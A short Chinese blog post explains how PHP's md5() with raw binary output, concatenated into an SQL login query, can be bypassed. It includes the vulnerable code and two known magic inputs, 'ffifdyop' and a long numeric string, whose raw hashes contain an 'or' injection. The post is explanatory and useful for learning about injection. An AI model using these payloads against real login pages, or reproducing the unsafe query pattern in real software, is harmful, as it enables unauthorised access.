---

title: md5-sql-injection
date: 2019-07-31 14:29:43
categories: 
 - 漏洞
tag: Vulns
classes: wide
---
# md5-sql-injection

有如下的php代码：

```php
<?php
$password = $_POST['password'];
$sql = "SELECT * FROM admin WHERE username = 'admin' and password = '".md5($password,true)."'";
$result = mysqli_query($link,$sql);
if(mysqli_num_rows($result)>0){
    echo 'Success';
}else{
    echo 'Failure';
}
?>
```

问是否能通过提交特定的POST参数password，让上示代码执行到“echo ‘Success’;”。

回答是肯定的。这显然是一个注入问题，问题的关键在于md5函数的第二个参数为true。

先看php中的md5函数，它有两个参数string和raw。 第一个参数string是必需的，规定要计算的字符串。 第二个参数raw可选，规定十六进制或二进制输出格式：

TRUE - 原始 - 16 字符二进制格式
FALSE - 默认 - 32 字符十六进制数
示例如下：

```php
<?php
$str = "Shanghai";
echo "字符串：".$str."<br>";
echo "TRUE - 原始 16 字符二进制格式：".md5($str, TRUE)."<br>";
echo "FALSE - 32 字符十六进制格式：".md5($str)."<br>";
?>
```

输出为：

```
字符串：Shanghai
TRUE - 原始 16 字符二进制格式：Tf頦+饲X0蠨鎗�)�
FALSE - 32 字符十六进制格式：5466ee572bcbc75830d044e66ab429bc
```

由上例可知，当md5函数的第二个参数为true时，该函数的输出是原始二进制格式，会被作为字符串处理。 理解这一点后，问题就简单了。 只要提交特定字符串，让其md5值以原始二进制格式输出（被当作字符串）时含有能触发SQL注入的特殊字符即可。

如何找到这样的字符串呢？百度一番后我找到了两个：

```
content: 129581926211651571912466741651878684928
hex: 06da5430449f8f6f23dfc1276f722738
raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1'or'8
string: T0Do#'or'8
```

和

```
content: ffifdyop
hex: 276f722736c95d99e921722cf9ed621c
raw: 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c
string: 'or'6]!r,b
```

提交`“129581926211651571912466741651878684928”`或`“ffifdyop”`都可以达到本文开头的目的。

### 参考：

https://blog.werner.wiki/php-md5-true-sqli/